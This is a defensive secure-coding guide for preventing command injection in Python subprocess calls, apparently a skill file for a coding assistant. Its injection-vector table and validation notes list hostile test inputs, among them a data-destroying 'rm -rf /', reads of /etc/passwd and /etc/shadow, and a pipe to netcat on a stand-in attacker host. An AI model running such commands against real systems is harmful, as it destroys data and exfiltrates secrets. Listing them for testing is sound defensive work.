# Security: Command Injection Prevention

**Purpose**: Prevent command injection when executing subprocesses.

**When to use**: Any `subprocess` usage.
---
---
name: security_command_injection
purpose: Prevent command injection when executing subprocesses
category: security
triggers:
  - subprocess
  - command injection
  - shell
  - os.system
  - popen
  - exec
dependencies:
  - stdlib/subprocess.md
  - security/path_traversal.md
  - security/input_validation.md
priority: primary
estimated_tokens: 1600
---

## Core Rules

### Never Use shell=True with User Input
```python
# NEVER
subprocess.run(f"echo {user_input}", shell=True)
subprocess.run("ls " + user_dir, shell=True)
subprocess.run(f"process {filename}", shell=True)

# ALWAYS use list form
subprocess.run(["echo", user_input])
subprocess.run(["ls", user_dir])
subprocess.run(["process", filename])
```

### Validate/Allowlist Commands
```python
ALLOWED_COMMANDS = {
    "git": ["git"],
    "docker": ["docker"],
    "kubectl": ["kubectl"],
}

def safe_run(command: str, args: list[str], **kwargs) -> subprocess.CompletedProcess:
    if command not in ALLOWED_COMMANDS:
        raise ValueError(f"Command not allowed: {command}")
    
    full_cmd = [command] + args
    return subprocess.run(full_cmd, **kwargs)
```

### Path Validation
```python
def safe_path(user_input: str, base: Path) -> Path:
    """Resolve path and ensure it's within base directory."""
    path = (base / user_input).resolve()
    if not path.is_relative_to(base.resolve()):
        raise ValueError("Path traversal attempt")
    return path

# Usage
safe_file = safe_path(user_filename, UPLOAD_DIR)
subprocess.run(["process", str(safe_file)])
```

### Environment Sanitization
```python
# Clean environment for subprocess
CLEAN_ENV = {
    "PATH": "/usr/bin:/bin",
    "LANG": "C.UTF-8",
    "HOME": "/tmp",
}

subprocess.run(cmd, env=CLEAN_ENV, ...)

# Or inherit but remove sensitive
env = os.environ.copy()
for key in ["SECRET_KEY", "DB_PASSWORD", "API_TOKEN"]:
    env.pop(key, None)
subprocess.run(cmd, env=env, ...)
```

### shlex for Complex Arguments
```python
# When you MUST parse a string command (legacy integration)
import shlex

def run_legacy_command(cmd_string: str) -> subprocess.CompletedProcess:
    # shlex splits safely, preserving quoted arguments
    cmd_list = shlex.split(cmd_string)
    # Still validate the command itself
    if cmd_list[0] not in ALLOWED_COMMANDS:
        raise ValueError(f"Command not allowed: {cmd_list[0]}")
    return subprocess.run(cmd_list, capture_output=True, text=True)

# Input: 'git commit -m "fix: update"' -> ['git', 'commit', '-m', 'fix: update']
# NOT: ['git', 'commit', '-m', 'fix:', 'update'] (naive split fails)
```

---

## Decision Rules

| Need | Pattern |
|------|---------|
| Run command | List form, no shell |
| User input as arg | Validate + list form |
| User input as path | Resolve + `is_relative_to` |
| Multiple commands | Chain `Popen` (no shell pipe) |
| Shell features (glob, vars) | Reimplement in Python |
| Parse string command | `shlex.split()` + validate |

---

## Preferred Patterns

```python
def run_command(
    cmd: list[str],
    *,
    cwd: Path | None = None,
    timeout: float = 30.0,
    env: dict[str, str] | None = None,
    input_data: str | None = None,
    allowlist: set[str] | None = None,
) -> subprocess.CompletedProcess:
    """Safe subprocess wrapper."""
    
    # Validate command
    if not cmd or not isinstance(cmd, list):
        raise ValueError("Command must be non-empty list")
    
    if allowlist and cmd[0] not in allowlist:
        raise ValueError(f"Command not allowed: {cmd[0]}")
    
    # Validate paths in args
    for arg in cmd[1:]:
        if isinstance(arg, Path):
            # Could add path validation here
            pass
    
    return subprocess.run(
        cmd,
        capture_output=True,
        text=True,
        encoding="utf-8",
        errors="replace",
        timeout=timeout,
        check=False,
        cwd=cwd,
        env=env,
        input=input_data,
    )

# Usage
result = run_command(
    ["docker", "build", "-t", image_name, "."],
    allowlist={"docker"},
    timeout=300,
)
```

---

## Common Injection Vectors (Test These)

| Vector | Example | Mitigation |
|--------|---------|------------|
| Command separator | `; rm -rf /` | List form, no shell |
| Subshell | `$(cat /etc/passwd)` | No shell |
| Backticks | `` `id` `` | No shell |
| Pipe | `| nc attacker.com 4444` | No shell |
| AND/OR | `&& cat /etc/shadow` | No shell |
| Newline | `\nmalicious_cmd` | No shell, validate input |
| Environment variable | `${IFS}cat${IFS}/etc/passwd` | Clean env, no shell |

---

## Avoid

- `shell=True` (except static trusted commands)
- `os.system()`, `os.popen()`
- String commands
- User input in command without validation
- Inheriting full environment

---

## Validation Considerations

- Test with injection payloads (`; rm -rf /`, `$(cat /etc/passwd)`, etc.)
- `bandit` B602, B603, B605, B607 checks
- Verify allowlist enforcement

---

## Related Skills

- `stdlib/subprocess.md`
- `security/path_traversal.md`
- `security/input_validation.md`